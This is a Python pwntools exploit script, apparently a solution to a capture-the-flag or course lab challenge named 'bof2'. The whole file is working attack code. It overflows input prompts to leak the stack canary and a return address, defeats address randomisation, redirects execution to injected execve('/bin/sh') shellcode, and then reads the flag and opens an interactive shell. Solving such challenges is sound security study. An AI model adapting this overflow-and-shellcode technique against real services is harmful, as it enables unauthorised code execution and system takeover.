#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof2'
port = 10259

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

code = """
	xor rax,rax
	push rax
	mov rbx,0x68732f2f6e69622f
	push rbx
	mov rdi,rsp
	push rax
	mov rdx,rsp
	push rdi
	mov rsi,rsp
	mov al,59
	syscall
"""

leak_message = b'A' * 41
r.recvuntil(b'What\'s your name? ')
r.send(leak_message)
r.recvuntil(leak_message)
origin_data = r.recvuntil(b'\n')
origin_data = origin_data.rstrip(b'\n')
leak_message = b'A' * 40
origin_data = b'\x00' + origin_data
origin_data = leak_message + origin_data
origin_data = origin_data + b'\x00' * 2
leak_message = b'A' * 56
r.recvuntil(b'What\'s the room number? ')
r.send(leak_message)
r.recvuntil(leak_message)
ret_addr = r.recvuntil(b'\n').rstrip(b'\n')
ret_addr = int.from_bytes(ret_addr, byteorder='little')
main_addr = ret_addr - 0xa0
base  = main_addr - off_main
msg_addr = base + 0xd31e0
msg_addr_bytes = msg_addr.to_bytes(8, byteorder='little')
bufmsg = origin_data + msg_addr_bytes
r.recvuntil(b'What\'s the customer\'s name? ')
r.send(bufmsg)
r.recvuntil(b'Leave your message: ')
payloads = asm(code)
r.send(payloads)
r.recvuntil(b'Thank you!\n')
r.sendline(b'cat FLAG')

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
